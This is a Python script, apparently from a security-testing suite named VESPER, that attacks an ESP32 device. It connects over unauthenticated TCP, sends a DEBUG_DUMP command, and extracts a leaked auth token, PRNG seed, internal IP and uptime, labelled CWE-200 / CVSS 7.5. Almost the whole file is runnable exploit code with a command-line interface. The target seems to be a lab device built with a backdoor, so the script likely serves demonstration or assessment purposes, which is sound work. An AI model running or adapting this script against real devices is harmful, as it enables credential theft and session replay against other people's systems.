#!/usr/bin/env python3
"""
VESPER ESP32 — Suite 1: Firmware Attack — Information Disclosure
================================================================
Sends the unauthenticated DEBUG_DUMP command over a plain TCP connection.
The firmware leaks the auth token, PRNG seed, WiFi IP, and device uptime
with zero credentials required.

  CWE  : CWE-200 — Exposure of Sensitive Information
  CVSS : 7.5 (High)

Run standalone:
    python scripts/attacks/firmware.py --target 192.168.1.112:15011
"""

import argparse
import socket
import sys
import time
from pathlib import Path

# Allow running both as a module and as a standalone script
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from scripts.attacks.common import (
    GREEN, RED, YELLOW, DIM, RESET,
    reset_clock, _ts, tx, rx, section, divider,
    send, verify_connection, print_result,
)


def attack_firmware_info_disclosure(host: str, port: int) -> dict:
    """
    Open a raw TCP connection and send DEBUG_DUMP without any authentication.
    Parse the response for TOKEN, SEED, WIFI_IP, and TICKS fields.
    """
    section(
        "Suite 1 — FIRMWARE ATTACK: Information Disclosure",
        f"Target: {host}:{port}  |  No credentials required  |  CWE-200 / CVSS 7.5",
    )

    t0       = time.time()
    evidence: list = []

    # ── Step 1: connect (no credentials) ─────────────────────────────────────
    divider("Step 1 — Open unauthenticated TCP connection")
    print(f"  {_ts()}{DIM}connecting to {host}:{port} ...{RESET}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(6.0)
        sock.connect((host, port))
        time.sleep(0.15)
        banner = b""
        try:
            banner = sock.recv(1024)
        except socket.timeout:
            pass
        rx(banner.decode("utf-8", errors="replace"), "ESP32 (banner)")
    except Exception as e:
        print(f"  {RED}Connection failed: {e}{RESET}")
        return {
            "name": "Information Disclosure (DEBUG_DUMP backdoor)",
            "suite": "Firmware", "severity": "HIGH", "success": False,
            "evidence": [str(e)], "duration_ms": 0, "impact": "N/A", "cvss": 7.5,
        }

    # ── Step 2: send DEBUG_DUMP without AUTH ──────────────────────────────────
    print()
    divider("Step 2 — Send DEBUG_DUMP  (no AUTH command first)")
    tx("DEBUG_DUMP", via=f"{host}:{port}")
    sock.sendall(b"DEBUG_DUMP\n")

    resp_raw = b""
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp_raw += chunk
            if b"WIFI_IP" in resp_raw or b"TICKS" in resp_raw:
                break
        except socket.timeout:
            break
    sock.close()

    # ── Step 3: show annotated response ──────────────────────────────────────
    resp = resp_raw.decode("utf-8", errors="replace")
    print()
    divider(f"Step 3 — Response received  ({len(resp_raw)} bytes)")
    rx(resp, "ESP32")
    print()

    success = "DEBUG:MEMORY_DUMP" in resp
    if success:
        evidence.append("DEBUG_DUMP accessible without authentication")
        for line in resp.splitlines():
            if line.startswith("TOKEN:") and len(line) > 6:
                evidence.append(f"Auth token leaked: '{line[6:]}'")
            elif line.startswith("SEED:"):
                evidence.append(f"PRNG seed leaked: {line[5:]}  (enables state prediction)")
            elif line.startswith("WIFI_IP:"):
                evidence.append(f"Internal IP disclosed: {line[8:]}")
            elif line.startswith("TICKS:"):
                evidence.append(f"Device uptime exposed: {line[6:]} ticks")

    return {
        "name":        "Information Disclosure (DEBUG_DUMP backdoor)",
        "suite":       "Firmware",
        "severity":    "HIGH",
        "success":     success,
        "evidence":    evidence,
        "duration_ms": (time.time() - t0) * 1000,
        "impact":      "Auth token theft + PRNG seed enables session prediction and replay",
        "cvss":        7.5,
    }


def main():
    parser = argparse.ArgumentParser(
        description="VESPER ESP32 — Suite 1: Firmware Info Disclosure"
    )
    parser.add_argument("--target", required=True,
                        help="ESP32 address, e.g. 192.168.1.112:15011")
    parser.add_argument("--no-verify", action="store_true",
                        help="Skip connection check")
    args = parser.parse_args()

    parts = args.target.split(":")
    host  = parts[0]
    port  = int(parts[1]) if len(parts) > 1 else 15011

    reset_clock()
    print(f"\n{'='*60}")
    print(f"  Suite 1 — Firmware Attack  |  {host}:{port}")
    print(f"{'='*60}\n")

    if not args.no_verify and not verify_connection(host, port):
        print("Cannot reach ESP32.\n")
        return 1

    result = attack_firmware_info_disclosure(host, port)
    print_result(result)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
